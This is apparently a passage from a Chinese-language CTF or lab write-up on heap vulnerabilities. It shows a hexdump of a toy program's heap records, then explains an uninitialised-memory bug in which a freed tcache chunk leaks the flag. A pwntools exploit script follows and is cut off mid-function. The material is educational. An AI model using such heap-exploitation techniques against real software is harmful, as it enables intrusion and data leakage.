<a id="__codelineno-1-33" name="__codelineno-1-33"></a><a href="#__codelineno-1-33"><span class="linenos" data-linenos=" 33 "></span></a>00000410  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-1-34" name="__codelineno-1-34"></a><a href="#__codelineno-1-34"><span class="linenos" data-linenos=" 34 "></span></a>00000420  e0 64 84 01 00 00 00 00  10 60 84 01 00 00 00 00  |.d.......`......|
<a id="__codelineno-1-35" name="__codelineno-1-35"></a><a href="#__codelineno-1-35"><span class="linenos" data-linenos=" 35 "></span></a>00000430  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-36" name="__codelineno-1-36"></a><a href="#__codelineno-1-36"><span class="linenos" data-linenos=" 36 "></span></a>00000440  61 62 63 33 32 31 00 00  00 00 00 00 00 00 00 00  |abc321..........|
<a id="__codelineno-1-37" name="__codelineno-1-37"></a><a href="#__codelineno-1-37"><span class="linenos" data-linenos=" 37 "></span></a>00000450  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-38" name="__codelineno-1-38"></a><a href="#__codelineno-1-38"><span class="linenos" data-linenos=" 38 "></span></a>00000460  90 64 84 01 00 00 00 00  3c 62 6c 61 6e 6b 2f 3e  |.d......&lt;blank/&gt;|
<a id="__codelineno-1-39" name="__codelineno-1-39"></a><a href="#__codelineno-1-39"><span class="linenos" data-linenos=" 39 "></span></a>00000470  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-40" name="__codelineno-1-40"></a><a href="#__codelineno-1-40"><span class="linenos" data-linenos=" 40 "></span></a>00000480  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-1-41" name="__codelineno-1-41"></a><a href="#__codelineno-1-41"><span class="linenos" data-linenos=" 41 "></span></a>00000490  50 65 84 01 00 00 00 00  10 60 84 01 00 00 00 00  |Pe.......`......|
<a id="__codelineno-1-42" name="__codelineno-1-42"></a><a href="#__codelineno-1-42"><span class="linenos" data-linenos=" 42 "></span></a>000004a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-43" name="__codelineno-1-43"></a><a href="#__codelineno-1-43"><span class="linenos" data-linenos=" 43 "></span></a>*
<a id="__codelineno-1-44" name="__codelineno-1-44"></a><a href="#__codelineno-1-44"><span class="linenos" data-linenos=" 44 "></span></a>000004d0  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-1-45" name="__codelineno-1-45"></a><a href="#__codelineno-1-45"><span class="linenos" data-linenos=" 45 "></span></a>000004e0  a0 65 84 01 00 00 00 00  10 60 84 01 00 00 00 00  |.e.......`......|
<a id="__codelineno-1-46" name="__codelineno-1-46"></a><a href="#__codelineno-1-46"><span class="linenos" data-linenos=" 46 "></span></a>000004f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-47" name="__codelineno-1-47"></a><a href="#__codelineno-1-47"><span class="linenos" data-linenos=" 47 "></span></a>00000500  70 34 73 73 77 30 72 64  00 00 00 00 00 00 00 00  |p4ssw0rd........|
<a id="__codelineno-1-48" name="__codelineno-1-48"></a><a href="#__codelineno-1-48"><span class="linenos" data-linenos=" 48 "></span></a>00000510  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-49" name="__codelineno-1-49"></a><a href="#__codelineno-1-49"><span class="linenos" data-linenos=" 49 "></span></a>00000520  50 65 84 01 00 00 00 00  2e 2e 2e 00 00 00 00 00  |Pe..............|
<a id="__codelineno-1-50" name="__codelineno-1-50"></a><a href="#__codelineno-1-50"><span class="linenos" data-linenos=" 50 "></span></a>00000530  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-51" name="__codelineno-1-51"></a><a href="#__codelineno-1-51"><span class="linenos" data-linenos=" 51 "></span></a>00000540  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-1-52" name="__codelineno-1-52"></a><a href="#__codelineno-1-52"><span class="linenos" data-linenos=" 52 "></span></a>00000550  10 66 84 01 00 00 00 00  10 60 84 01 00 00 00 00  |.f.......`......|
<a id="__codelineno-1-53" name="__codelineno-1-53"></a><a href="#__codelineno-1-53"><span class="linenos" data-linenos=" 53 "></span></a>00000560  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-54" name="__codelineno-1-54"></a><a href="#__codelineno-1-54"><span class="linenos" data-linenos=" 54 "></span></a>*
<a id="__codelineno-1-55" name="__codelineno-1-55"></a><a href="#__codelineno-1-55"><span class="linenos" data-linenos=" 55 "></span></a>00000590  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-1-56" name="__codelineno-1-56"></a><a href="#__codelineno-1-56"><span class="linenos" data-linenos=" 56 "></span></a>000005a0  60 66 84 01 00 00 00 00  10 60 84 01 00 00 00 00  |`f.......`......|
<a id="__codelineno-1-57" name="__codelineno-1-57"></a><a href="#__codelineno-1-57"><span class="linenos" data-linenos=" 57 "></span></a>000005b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-58" name="__codelineno-1-58"></a><a href="#__codelineno-1-58"><span class="linenos" data-linenos=" 58 "></span></a>000005c0  61 61 61 62 62 62 00 00  00 00 00 00 00 00 00 00  |aaabbb..........|
<a id="__codelineno-1-59" name="__codelineno-1-59"></a><a href="#__codelineno-1-59"><span class="linenos" data-linenos=" 59 "></span></a>000005d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-60" name="__codelineno-1-60"></a><a href="#__codelineno-1-60"><span class="linenos" data-linenos=" 60 "></span></a>000005e0  10 66 84 01 00 00 00 00  3c 61 6c 65 72 74 3e 00  |.f......&lt;alert&gt;.|
<a id="__codelineno-1-61" name="__codelineno-1-61"></a><a href="#__codelineno-1-61"><span class="linenos" data-linenos=" 61 "></span></a>000005f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-62" name="__codelineno-1-62"></a><a href="#__codelineno-1-62"><span class="linenos" data-linenos=" 62 "></span></a>00000600  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-1-63" name="__codelineno-1-63"></a><a href="#__codelineno-1-63"><span class="linenos" data-linenos=" 63 "></span></a>00000610  d0 66 84 01 00 00 00 00  10 60 84 01 00 00 00 00  |.f.......`......|
<a id="__codelineno-1-64" name="__codelineno-1-64"></a><a href="#__codelineno-1-64"><span class="linenos" data-linenos=" 64 "></span></a>00000620  74 65 72 20 74 68 61 6e  20 75 67 6c 79 00 00 00  |ter than ugly...|
<a id="__codelineno-1-65" name="__codelineno-1-65"></a><a href="#__codelineno-1-65"><span class="linenos" data-linenos=" 65 "></span></a>00000630  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-66" name="__codelineno-1-66"></a><a href="#__codelineno-1-66"><span class="linenos" data-linenos=" 66 "></span></a>*
<a id="__codelineno-1-67" name="__codelineno-1-67"></a><a href="#__codelineno-1-67"><span class="linenos" data-linenos=" 67 "></span></a>00000650  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-1-68" name="__codelineno-1-68"></a><a href="#__codelineno-1-68"><span class="linenos" data-linenos=" 68 "></span></a>00000660  20 67 84 01 00 00 00 00  10 60 84 01 00 00 00 00  | g.......`......|
<a id="__codelineno-1-69" name="__codelineno-1-69"></a><a href="#__codelineno-1-69"><span class="linenos" data-linenos=" 69 "></span></a>00000670  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-70" name="__codelineno-1-70"></a><a href="#__codelineno-1-70"><span class="linenos" data-linenos=" 70 "></span></a>00000680  6d 61 72 6b 6e 62 31 31  00 00 00 00 00 00 00 00  |marknb11........|
<a id="__codelineno-1-71" name="__codelineno-1-71"></a><a href="#__codelineno-1-71"><span class="linenos" data-linenos=" 71 "></span></a>00000690  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-72" name="__codelineno-1-72"></a><a href="#__codelineno-1-72"><span class="linenos" data-linenos=" 72 "></span></a>000006a0  d0 66 84 01 00 00 00 00  77 61 74 63 68 20 6f 75  |.f......watch ou|
<a id="__codelineno-1-73" name="__codelineno-1-73"></a><a href="#__codelineno-1-73"><span class="linenos" data-linenos=" 73 "></span></a>000006b0  74 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |t...............|
<a id="__codelineno-1-74" name="__codelineno-1-74"></a><a href="#__codelineno-1-74"><span class="linenos" data-linenos=" 74 "></span></a>000006c0  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-1-75" name="__codelineno-1-75"></a><a href="#__codelineno-1-75"><span class="linenos" data-linenos=" 75 "></span></a>000006d0  90 67 84 01 00 00 00 00  10 60 84 01 00 00 00 00  |.g.......`......|
<a id="__codelineno-1-76" name="__codelineno-1-76"></a><a href="#__codelineno-1-76"><span class="linenos" data-linenos=" 76 "></span></a>000006e0  65 72 20 74 68 61 6e 20  69 6d 70 6c 69 63 69 74  |er than implicit|
<a id="__codelineno-1-77" name="__codelineno-1-77"></a><a href="#__codelineno-1-77"><span class="linenos" data-linenos=" 77 "></span></a>000006f0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-78" name="__codelineno-1-78"></a><a href="#__codelineno-1-78"><span class="linenos" data-linenos=" 78 "></span></a>*
<a id="__codelineno-1-79" name="__codelineno-1-79"></a><a href="#__codelineno-1-79"><span class="linenos" data-linenos=" 79 "></span></a>00000710  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-1-80" name="__codelineno-1-80"></a><a href="#__codelineno-1-80"><span class="linenos" data-linenos=" 80 "></span></a>00000720  00 00 00 00 00 00 00 00  10 60 84 01 00 00 00 00  |.........`......|
<a id="__codelineno-1-81" name="__codelineno-1-81"></a><a href="#__codelineno-1-81"><span class="linenos" data-linenos=" 81 "></span></a>00000730  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-82" name="__codelineno-1-82"></a><a href="#__codelineno-1-82"><span class="linenos" data-linenos=" 82 "></span></a>00000740  6d 39 35 30 35 32 34 00  00 00 00 00 00 00 00 00  |m950524.........|
<a id="__codelineno-1-83" name="__codelineno-1-83"></a><a href="#__codelineno-1-83"><span class="linenos" data-linenos=" 83 "></span></a>00000750  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-84" name="__codelineno-1-84"></a><a href="#__codelineno-1-84"><span class="linenos" data-linenos=" 84 "></span></a>00000760  90 67 84 01 00 00 00 00  5f 5f 5f 5f 5f 5f 5f 5f  |.g......________|
<a id="__codelineno-1-85" name="__codelineno-1-85"></a><a href="#__codelineno-1-85"><span class="linenos" data-linenos=" 85 "></span></a>00000770  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-86" name="__codelineno-1-86"></a><a href="#__codelineno-1-86"><span class="linenos" data-linenos=" 86 "></span></a>00000780  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-1-87" name="__codelineno-1-87"></a><a href="#__codelineno-1-87"><span class="linenos" data-linenos=" 87 "></span></a>00000790  00 00 00 00 00 00 00 00  10 60 84 01 00 00 00 00  |.........`......|
<a id="__codelineno-1-88" name="__codelineno-1-88"></a><a href="#__codelineno-1-88"><span class="linenos" data-linenos=" 88 "></span></a>000007a0  6e 74 21 20 76 69 6e 63  65 6e 74 00 00 00 00 00  |nt! vincent.....|
<a id="__codelineno-1-89" name="__codelineno-1-89"></a><a href="#__codelineno-1-89"><span class="linenos" data-linenos=" 89 "></span></a>000007b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-90" name="__codelineno-1-90"></a><a href="#__codelineno-1-90"><span class="linenos" data-linenos=" 90 "></span></a>*
<a id="__codelineno-1-91" name="__codelineno-1-91"></a><a href="#__codelineno-1-91"><span class="linenos" data-linenos=" 91 "></span></a>000007d0  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-1-92" name="__codelineno-1-92"></a><a href="#__codelineno-1-92"><span class="linenos" data-linenos=" 92 "></span></a>000007e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-93" name="__codelineno-1-93"></a><a href="#__codelineno-1-93"><span class="linenos" data-linenos=" 93 "></span></a>*
<a id="__codelineno-1-94" name="__codelineno-1-94"></a><a href="#__codelineno-1-94"><span class="linenos" data-linenos=" 94 "></span></a>00000800  77 69 6c 6c 33 32 31 32  33 00 00 00 00 00 00 00  |will32123.......|
<a id="__codelineno-1-95" name="__codelineno-1-95"></a><a href="#__codelineno-1-95"><span class="linenos" data-linenos=" 95 "></span></a>00000810  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-96" name="__codelineno-1-96"></a><a href="#__codelineno-1-96"><span class="linenos" data-linenos=" 96 "></span></a>00000820  50 68 84 01 00 00 00 00  69 27 6d 20 66 69 6e 65  |Ph......i&#39;m fine|
<a id="__codelineno-1-97" name="__codelineno-1-97"></a><a href="#__codelineno-1-97"><span class="linenos" data-linenos=" 97 "></span></a>00000830  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-98" name="__codelineno-1-98"></a><a href="#__codelineno-1-98"><span class="linenos" data-linenos=" 98 "></span></a>00000840  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-1-99" name="__codelineno-1-99"></a><a href="#__codelineno-1-99"><span class="linenos" data-linenos=" 99 "></span></a>00000850  00 00 00 00 00 00 00 00  62 32 39 76 62 32 39 6f  |........b29vb29o|
<a id="__codelineno-1-100" name="__codelineno-1-100"></a><a href="#__codelineno-1-100"><span class="linenos" data-linenos="100 "></span></a>00000860  59 57 35 6b 63 32 39 74  5a 51 3d 3d 00 00 00 00  |YW5kc29tZQ==....|
<a id="__codelineno-1-101" name="__codelineno-1-101"></a><a href="#__codelineno-1-101"><span class="linenos" data-linenos="101 "></span></a>00000870  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-102" name="__codelineno-1-102"></a><a href="#__codelineno-1-102"><span class="linenos" data-linenos="102 "></span></a>*
<a id="__codelineno-1-103" name="__codelineno-1-103"></a><a href="#__codelineno-1-103"><span class="linenos" data-linenos="103 "></span></a>00000890  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-1-104" name="__codelineno-1-104"></a><a href="#__codelineno-1-104"><span class="linenos" data-linenos="104 "></span></a>000008a0  d0 67 84 01 00 00 00 00  00 00 00 00 00 00 00 00  |.g..............|
<a id="__codelineno-1-105" name="__codelineno-1-105"></a><a href="#__codelineno-1-105"><span class="linenos" data-linenos="105 "></span></a>000008b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-106" name="__codelineno-1-106"></a><a href="#__codelineno-1-106"><span class="linenos" data-linenos="106 "></span></a>000008c0  6a 6a 6a 37 38 39 00 00  00 00 00 00 00 00 00 00  |jjj789..........|
<a id="__codelineno-1-107" name="__codelineno-1-107"></a><a href="#__codelineno-1-107"><span class="linenos" data-linenos="107 "></span></a>000008d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-108" name="__codelineno-1-108"></a><a href="#__codelineno-1-108"><span class="linenos" data-linenos="108 "></span></a>000008e0  10 69 84 01 00 00 00 00  54 65 61 63 68 20 6d 65  |.i......Teach me|
<a id="__codelineno-1-109" name="__codelineno-1-109"></a><a href="#__codelineno-1-109"><span class="linenos" data-linenos="109 "></span></a>000008f0  20 61 6e 64 20 49 20 72  65 6d 65 6d 62 65 72 2e  | and I remember.|
<a id="__codelineno-1-110" name="__codelineno-1-110"></a><a href="#__codelineno-1-110"><span class="linenos" data-linenos="110 "></span></a>00000900  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-1-111" name="__codelineno-1-111"></a><a href="#__codelineno-1-111"><span class="linenos" data-linenos="111 "></span></a>00000910  40 68 84 01 00 00 00 00  00 00 00 00 00 00 00 00  |@h..............|
<a id="__codelineno-1-112" name="__codelineno-1-112"></a><a href="#__codelineno-1-112"><span class="linenos" data-linenos="112 "></span></a>00000920  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-113" name="__codelineno-1-113"></a><a href="#__codelineno-1-113"><span class="linenos" data-linenos="113 "></span></a>*
<a id="__codelineno-1-114" name="__codelineno-1-114"></a><a href="#__codelineno-1-114"><span class="linenos" data-linenos="114 "></span></a>00000950  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-1-115" name="__codelineno-1-115"></a><a href="#__codelineno-1-115"><span class="linenos" data-linenos="115 "></span></a>00000960  48 65 72 72 79 00 00 00  00 00 00 00 00 00 00 00  |Herry...........|
<a id="__codelineno-1-116" name="__codelineno-1-116"></a><a href="#__codelineno-1-116"><span class="linenos" data-linenos="116 "></span></a>00000970  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-117" name="__codelineno-1-117"></a><a href="#__codelineno-1-117"><span class="linenos" data-linenos="117 "></span></a>00000980  68 41 42 43 33 32 31 00  00 00 00 00 00 00 00 00  |hABC321.........|
<a id="__codelineno-1-118" name="__codelineno-1-118"></a><a href="#__codelineno-1-118"><span class="linenos" data-linenos="118 "></span></a>00000990  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-119" name="__codelineno-1-119"></a><a href="#__codelineno-1-119"><span class="linenos" data-linenos="119 "></span></a>000009a0  d0 69 84 01 00 00 00 00  68 61 72 64 2d 77 6f 72  |.i......hard-wor|
<a id="__codelineno-1-120" name="__codelineno-1-120"></a><a href="#__codelineno-1-120"><span class="linenos" data-linenos="120 "></span></a>000009b0  6b 69 6e 67 21 00 00 00  00 00 00 00 00 00 00 00  |king!...........|
<a id="__codelineno-1-121" name="__codelineno-1-121"></a><a href="#__codelineno-1-121"><span class="linenos" data-linenos="121 "></span></a>000009c0  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-1-122" name="__codelineno-1-122"></a><a href="#__codelineno-1-122"><span class="linenos" data-linenos="122 "></span></a>000009d0  6e 6f 20 69 6e 74 72 6f  20 61 74 20 61 6c 6c 00  |no intro at all.|
<a id="__codelineno-1-123" name="__codelineno-1-123"></a><a href="#__codelineno-1-123"><span class="linenos" data-linenos="123 "></span></a>000009e0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-124" name="__codelineno-1-124"></a><a href="#__codelineno-1-124"><span class="linenos" data-linenos="124 "></span></a>*
<a id="__codelineno-1-125" name="__codelineno-1-125"></a><a href="#__codelineno-1-125"><span class="linenos" data-linenos="125 "></span></a>00000a10  00 00 00 00 00 00 00 00  71 00 00 00 00 00 00 00  |........q.......|
<a id="__codelineno-1-126" name="__codelineno-1-126"></a><a href="#__codelineno-1-126"><span class="linenos" data-linenos="126 "></span></a>00000a20  47 61 72 79 00 00 00 00  00 00 00 00 00 00 00 00  |Gary............|
<a id="__codelineno-1-127" name="__codelineno-1-127"></a><a href="#__codelineno-1-127"><span class="linenos" data-linenos="127 "></span></a>00000a30  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-128" name="__codelineno-1-128"></a><a href="#__codelineno-1-128"><span class="linenos" data-linenos="128 "></span></a>00000a40  67 67 77 70 32 30 32 34  00 00 00 00 00 00 00 00  |ggwp2024........|
<a id="__codelineno-1-129" name="__codelineno-1-129"></a><a href="#__codelineno-1-129"><span class="linenos" data-linenos="129 "></span></a>00000a50  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-130" name="__codelineno-1-130"></a><a href="#__codelineno-1-130"><span class="linenos" data-linenos="130 "></span></a>00000a60  90 6a 84 01 00 00 00 00  49 20 6e 65 76 65 72 20  |.j......I never |
<a id="__codelineno-1-131" name="__codelineno-1-131"></a><a href="#__codelineno-1-131"><span class="linenos" data-linenos="131 "></span></a>00000a70  77 61 6c 6b 20 62 61 63  6b 77 61 72 64 73 2e 00  |walk backwards..|
<a id="__codelineno-1-132" name="__codelineno-1-132"></a><a href="#__codelineno-1-132"><span class="linenos" data-linenos="132 "></span></a>00000a80  00 00 00 00 00 00 00 00  51 00 00 00 00 00 00 00  |........Q.......|
<a id="__codelineno-1-133" name="__codelineno-1-133"></a><a href="#__codelineno-1-133"><span class="linenos" data-linenos="133 "></span></a>00000a90  74 68 65 20 62 65 73 74  20 67 61 72 79 20 69 6e  |the best gary in|
<a id="__codelineno-1-134" name="__codelineno-1-134"></a><a href="#__codelineno-1-134"><span class="linenos" data-linenos="134 "></span></a>00000aa0  20 74 68 65 20 77 6f 72  6c 64 00 00 00 00 00 00  | the world......|
<a id="__codelineno-1-135" name="__codelineno-1-135"></a><a href="#__codelineno-1-135"><span class="linenos" data-linenos="135 "></span></a>00000ab0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-136" name="__codelineno-1-136"></a><a href="#__codelineno-1-136"><span class="linenos" data-linenos="136 "></span></a>*
<a id="__codelineno-1-137" name="__codelineno-1-137"></a><a href="#__codelineno-1-137"><span class="linenos" data-linenos="137 "></span></a>00000ad0  00 00 00 00 00 00 00 00  31 05 02 00 00 00 00 00  |........1.......|
<a id="__codelineno-1-138" name="__codelineno-1-138"></a><a href="#__codelineno-1-138"><span class="linenos" data-linenos="138 "></span></a>00000ae0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
<a id="__codelineno-1-139" name="__codelineno-1-139"></a><a href="#__codelineno-1-139"><span class="linenos" data-linenos="139 "></span></a>*
<a id="__codelineno-1-140" name="__codelineno-1-140"></a><a href="#__codelineno-1-140"><span class="linenos" data-linenos="140 "></span></a>00001000
</code></pre></div>
<h2 id="_4">堆上常见漏洞<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<h4 id="uninit">Uninit<a class="headerlink" href="#uninit" title="Permanent link">&para;</a></h4>
<p>​   程序相比exampl.c少了<code>memset()</code>函数，即在处理用户添加时没有对堆进行初始化。观察到程序中使用<code>malloc()</code>申请了一个内存为0x40的字符串<code>flag</code>，并进行了<code>free()</code>操作，即将<code>flag</code>放入了tcache。同时，程序中对于<code>info-&gt;intro</code>的内存申请大小也为0x40，那么在第一次申请<code>info-&gt;intro</code>的时候，对应的chunk内就存储了所要的flag。因此，只需进行一次add操作，再进行一次show操作就可以暴露出程序中的flag。</p>
<div class="language-python highlight"><span class="filename">Python</span><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1"></a><a href="#__codelineno-2-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-2-2" name="__codelineno-2-2"></a><a href="#__codelineno-2-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="kn">from</span><span class="w"> </span><span class="nn">typing</span><span class="w"> </span><span class="kn">import</span> <span class="n">Tuple</span>
<a id="__codelineno-2-3" name="__codelineno-2-3"></a><a href="#__codelineno-2-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<a id="__codelineno-2-4" name="__codelineno-2-4"></a><a href="#__codelineno-2-4"><span class="linenos" data-linenos=" 4 "></span></a>
<a id="__codelineno-2-5" name="__codelineno-2-5"></a><a href="#__codelineno-2-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_add</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">intro</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">motto</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
<a id="__codelineno-2-6" name="__codelineno-2-6"></a><a href="#__codelineno-2-6"><span class="linenos" data-linenos=" 6 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-7" name="__codelineno-2-7"></a><a href="#__codelineno-2-7"><span class="linenos" data-linenos=" 7 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
<a id="__codelineno-2-8" name="__codelineno-2-8"></a><a href="#__codelineno-2-8"><span class="linenos" data-linenos=" 8 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;name &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-9" name="__codelineno-2-9"></a><a href="#__codelineno-2-9"><span class="linenos" data-linenos=" 9 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
<a id="__codelineno-2-10" name="__codelineno-2-10"></a><a href="#__codelineno-2-10"><span class="linenos" data-linenos="10 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;password &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-11" name="__codelineno-2-11"></a><a href="#__codelineno-2-11"><span class="linenos" data-linenos="11 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<a id="__codelineno-2-12" name="__codelineno-2-12"></a><a href="#__codelineno-2-12"><span class="linenos" data-linenos="12 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;introduction &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-13" name="__codelineno-2-13"></a><a href="#__codelineno-2-13"><span class="linenos" data-linenos="13 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">intro</span><span class="p">)</span>
<a id="__codelineno-2-14" name="__codelineno-2-14"></a><a href="#__codelineno-2-14"><span class="linenos" data-linenos="14 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;motto &gt; &quot;</span><span class="p">)</span>
<a id="__codelineno-2-15" name="__codelineno-2-15"></a><a href="#__codelineno-2-15"><span class="linenos" data-linenos="15 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">motto</span><span class="p">)</span>
<a id="__codelineno-2-16" name="__codelineno-2-16"></a><a href="#__codelineno-2-16"><span class="linenos" data-linenos="16 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;at index &quot;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<a id="__codelineno-2-17" name="__codelineno-2-17"></a><a href="#__codelineno-2-17"><span class="linenos" data-linenos="17 "></span></a>    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
<a id="__codelineno-2-18" name="__codelineno-2-18"></a><a href="#__codelineno-2-18"><span class="linenos" data-linenos="18 "></span></a>    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<a id="__codelineno-2-19" name="__codelineno-2-19"></a><a href="#__codelineno-2-19"><span class="linenos" data-linenos="19 "></span></a>
<a id="__codelineno-2-20" name="__codelineno-2-20"></a><a href="#__codelineno-2-20"><span class="linenos" data-linenos="20 "></span></a><span class="k">def</span><span class="w"> </span><span class="nf">handle_del</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">password</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="kc">None</span><span class="p">:</span>
<a id="__codelineno-2-21" name="__codelineno-2-21"></a><a href="#__codelineno-2-21"><span class="linenos" data-linenos="21 "></span></a>    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;[ 5 ] leave</span><span class="se">\n</span><span class="s2">&gt; &quot;</span><span class="p">)</span>
